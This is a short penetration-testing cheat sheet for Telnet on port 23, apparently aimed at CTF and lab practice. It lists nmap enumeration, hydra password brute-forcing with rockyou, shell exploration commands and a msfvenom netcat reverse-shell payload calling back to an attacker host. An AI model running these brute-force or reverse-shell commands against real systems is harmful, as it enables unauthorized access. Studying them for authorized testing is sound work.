# Telnet – Port 23

**Port:** 23/TCP  
**Service:** Telnet

Telnet connects to remote systems using plain text (no encryption), making credentials and data vulnerable to interception.

### 1. Enumeration

`nmap -sV -sC -p 23 <IP>` : Identify Telnet service and detect available information.

`ping -c 4 <IP>` : Check whether the host is reachable.

`telnet <IP> 23` : Connect to the Telnet service and check for a login prompt, menu, or shell.

### 2. Login Testing

Try default or weak credentials if permitted (e.g., `admin:admin`).

`hydra -l <username> -P /usr/share/wordlists/rockyou.txt <IP> telnet` : Test passwords using Hydra (authorized labs only).

### 3. Exploitation (If Applicable)

If you obtain shell access, explore the system:

- `whoami` : Check current user.
- `ls` : List files and directories.
- `pwd` : Show current directory.
- `find / -name "user.txt" 2>/dev/null` : Search for a user flag.

### 4. Reverse Shell (If Command Execution Is Available)

Generate a reverse shell payload:

`msfvenom -p cmd/unix/reverse_netcat LHOST=<YOUR_IP> LPORT=4444 R`

Start a listener on Kali:

`nc -lvnp 4444`

Execute the payload on the authorized target to establish a connection.

**Why it works:** Telnet transmits credentials and data without encryption, making them vulnerable to interception. Weak credentials or command execution vulnerabilities may provide unauthorized system access.

**Note:** A restricted menu does not automatically allow a reverse shell. Command execution must be available, and the target must be able to connect back to your listener.
